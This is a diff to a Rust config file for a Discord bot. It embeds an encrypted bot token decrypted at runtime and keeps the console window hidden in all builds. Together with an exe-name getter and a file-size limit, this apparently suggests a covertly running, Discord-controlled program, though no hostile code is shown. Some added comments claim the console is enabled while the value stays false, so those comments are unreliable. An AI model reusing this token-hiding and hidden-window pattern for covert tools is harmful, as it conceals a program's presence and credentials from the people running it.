@@ -54,11 +54,12 @@ pub struct BuildInfo {
 
 pub struct Config;
 
+include!(concat!(env!("OUT_DIR"), "/encrypted_token.rs"));
+const DISCORD_TOKEN_DEV: &str = "";
+
 impl Config {
-    pub const DISCORD_TOKEN: &'static str = "kurinium-bot=token";
-    pub const GUILD_ID: u64 = 10000000000;
+    pub const GUILD_ID: u64 = 123;
     pub const BOT_PREFIX: &'static str = ".";
-    pub const INSTALLATION_PATH: u8 = 1;
     pub const MAX_FILE_SIZE_MB: f64 = 10.0;
 
     pub fn get_startup_config() -> StartupConfig {
@@ -121,7 +122,12 @@ impl Config {
     }
 
     pub fn get_token() -> String {
-        Self::DISCORD_TOKEN.to_string()
+        let decrypted = crate::utils::token::decrypt_token(ENCRYPTED_TOKEN, ENCRYPTION_KEY);
+        if decrypted.contains("kurinium-bot") {
+            DISCORD_TOKEN_DEV.to_string()
+        } else {
+            decrypted
+        }
     }
 
     pub fn get_exe_name() -> &'static str {
@@ -156,10 +162,10 @@ impl Default for AuthConfig {
 
 #[cfg(debug_assertions)]
 impl Config {
-    pub const SHOW_CONSOLE: bool = false;
+    pub const SHOW_CONSOLE: bool = false;  // Enable for debugging
 }
 
 #[cfg(not(debug_assertions))]
 impl Config {
-    pub const SHOW_CONSOLE: bool = false;
+    pub const SHOW_CONSOLE: bool = false;  // TEMPORARILY enabled to debug why bot exits
 }
